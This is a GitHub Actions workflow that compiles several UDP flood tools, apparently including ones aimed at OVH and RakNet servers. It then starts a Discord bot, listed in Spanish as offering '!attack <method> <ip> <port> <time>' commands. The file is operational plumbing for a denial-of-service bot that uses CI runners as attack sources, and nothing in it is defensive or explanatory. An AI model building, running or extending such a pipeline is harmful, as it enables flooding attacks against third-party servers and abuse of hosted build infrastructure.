name: UDPsBotRaknet

on:
  workflow_dispatch:
  push:
    branches:
      - main

jobs:
  build-and-run:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout repository
        uses: actions/checkout@v4

      - name: Set up Python
        uses: actions/setup-python@v4
        with:
          python-version: '3.11'

      - name: Set up Go
        uses: actions/setup-go@v4
        with:
          go-version: '1.21'

      - name: Install Go dependencies
        run: |
          go mod init bot
          go get github.com/sandertv/go-raknet
          go get github.com/sirupsen/logrus

      - name: Install Python dependencies
        run: |
          python -m pip install --upgrade pip
          pip install -U discord.py || true

      - name: Ensure build tools are available
        run: |
          sudo apt-get update
          sudo apt-get install -y build-essential

      - name: Build UDP binaries
        run: |
          # Compilar udp
          if [ -f udp.c ]; then
            gcc -O3 -pthread -o udp udp.c || true
            echo "✓ Compilado: udp"
            chmod +x udp
          fi

          # Compilar udphex
          if [ -f udphex.c ]; then
            gcc -O3 udphex.c -o udphex || true
            echo "✓ Compilado: udphex"
            chmod +x udphex
          fi

          # Compilar udppps
          if [ -f udppps.c ]; then
            gcc -O3 udppps.c -o udppps || true
            echo "✓ Compilado: udppps"
            chmod +x udppps
          fi

          # Compilar ovh
          if [ -f ovh.c ]; then
            gcc -O3 -pthread ovh.c -o ovh || true
            if [ -f ovh ]; then
              echo "✓ Compilado: ovh"
              chmod +x ovh
            fi
          fi

          # Compilar udppayload
          if [ -f udppayload.c ]; then
            gcc -O3 -pthread udppayload.c -o udppayload || true
            if [ -f udppayload ]; then
              echo "✓ Compilado: udppayload"
              chmod +x udppayload
            fi
          fi

          # Verificar scripts Go
          echo ""
          echo "=== Scripts Go ==="
          for script in udpflood.go raknet.go; do
            if [ -f "$script" ]; then
              echo "✓ $script disponible"
            else
              echo "✗ $script no encontrado"
            fi
          done

      - name: Run bot
        env:
          KEYS: ${{ secrets.KEYS }}
        run: |
          echo "====================================="
          echo "Iniciando bot con todos los métodos"
          echo "Comandos disponibles:"
          echo "  !attack udp <ip> <puerto> <tiempo>"
          echo "  !attack udphex <ip> <puerto> <tiempo>"
          echo "  !attack udppps <ip> <puerto> <tiempo>"
          echo "  !attack udpflood <ip> <puerto> <tiempo>"
          echo "  !attack ovh <ip> <puerto> <tiempo>"
          echo "  !attack udppayload <ip> <puerto> <tiempo> <payload>"
          echo "  !attack raknet <ip> <puerto> <tiempo>"
          echo "  !methods - Muestra métodos"
          echo "====================================="
          python bot.py
